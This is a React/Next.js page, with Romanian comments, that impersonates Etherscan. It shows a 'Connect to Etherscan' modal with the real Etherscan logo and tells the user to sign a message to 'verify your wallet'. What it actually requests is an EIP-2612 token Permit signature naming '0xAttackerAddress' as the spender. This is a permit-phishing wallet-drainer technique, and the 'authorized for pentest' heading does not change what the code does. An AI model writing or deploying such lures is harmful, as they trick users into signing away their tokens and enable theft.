"use client";
import { useState } from "react";

// Adaugă această declarație pentru TypeScript
declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function Home() {
  const [showModal, setShowModal] = useState(false);
  const [signature, setSignature] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);

  // Exemplu de date pentru permit (EIP-2612)
  const domain = {
    name: "Uniswap V2",
    version: "1",
    chainId: 1,
    verifyingContract: "0xYourTokenAddress" // Adresa tokenului EIP-2612 (ex: USDC, UNI, DAI, etc.)
  };

  const types = {
    Permit: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "nonce", type: "uint256" },
      { name: "deadline", type: "uint256" }
    ]
  };

  // Exemplu: deadline 1 oră de acum, value 1 token (18 decimals)
  const value: any = {
    owner: "", // completat după conectare
    spender: "0xAttackerAddress", // adresa de test sau a "atacatorului"
    value: "1000000000000000000", // 1 token (18 decimals)
    nonce: 0, // completat după conectare (poți lăsa 0 pentru test)
    deadline: Math.floor(Date.now() / 1000) + 3600
  };

  // Conectare la MetaMask și semnare permit
  const handleSign = async () => {
    setError(null);
    setSignature(null);
    if (!window.ethereum) {
      setError("MetaMask nu este instalat.");
      return;
    }
    try {
      // 1. Cere adresa utilizatorului
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      value.owner = accounts[0];

      // 2. (Opțional) Ia nonce-ul real de pe contractul tokenului (aici hardcodat 0)
      // Într-un test real, folosește ethers.js/web3.js să citești nonce-ul corect

      // 3. Construiește payload-ul EIP-712
      const msgParams = JSON.stringify({
        domain,
        types,
        primaryType: "Permit",
        message: value
      });

      // 4. Cere semnătura
      const sig = await window.ethereum.request({
        method: "eth_signTypedData_v4",
        params: [value.owner, msgParams]
      });

      setSignature(sig);
    } catch (e: any) {
      setError(e.message || "Eroare la semnare.");
    }
  };

  return (
    <div style={{ padding: 40, fontFamily: "sans-serif" }}>
      <h1>I have permission and authorized for pentest</h1>
      <button
        onClick={() => setShowModal(true)}
        style={{
          fontSize: 20,
          padding: 10,
          background: "#0070f3",
          color: "#fff",
          border: "none",
          borderRadius: 6,
          cursor: "pointer"
        }}
      >
        Connect with Etherscan
      </button>

      {showModal && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            width: "100vw",
            height: "100vh",
            background: "rgba(0,0,0,0.5)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 1000
          }}
        >
          <div
            style={{
              background: "#fff",
              borderRadius: 12,
              padding: 32,
              minWidth: 350,
              boxShadow: "0 8px 32px rgba(0,0,0,0.2)",
              textAlign: "center",
              position: "relative"
            }}
          >
            <img
              src="https://etherscan.io/images/brandassets/etherscan-logo-circle.svg"
              alt="Etherscan"
              style={{ width: 60, marginBottom: 16 }}
            />
            <h2 style={{ margin: "0 0 12px 0" }}>Connect to Etherscan</h2>
            <p style={{ color: "#444", marginBottom: 24 }}>
              Please sign this message to verify your wallet and continue.
            </p>
            <button
              onClick={handleSign}
              style={{
                fontSize: 18,
                padding: "10px 24px",
                background: "#21a0f6",
                color: "#fff",
                border: "none",
                borderRadius: 6,
                cursor: "pointer"
              }}
            >
              Sign Message
            </button>
            <button
              onClick={() => setShowModal(false)}
              style={{
                fontSize: 16,
                padding: "8px 16px",
                background: "#eee",
                color: "#333",
                border: "none",
                borderRadius: 6,
                cursor: "pointer",
                marginLeft: 16
              }}
            >
              Cancel
            </button>
            <div style={{ position: "absolute", top: 12, right: 16, cursor: "pointer" }} onClick={() => setShowModal(false)}>
              <svg width="24" height="24" fill="#888"><path d="M18 6L6 18M6 6l12 12" stroke="#888" strokeWidth="2" strokeLinecap="round"/></svg>
            </div>
            {signature && (
              <div style={{ marginTop: 24, wordBreak: "break-all", color: "#0a0" }}>
                <b>Semnătură obținută:</b>
                <div style={{ fontSize: 12 }}>{signature}</div>
              </div>
            )}
            {error && (
              <div style={{ marginTop: 24, color: "#c00" }}>
                <b>Eroare:</b> {error}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
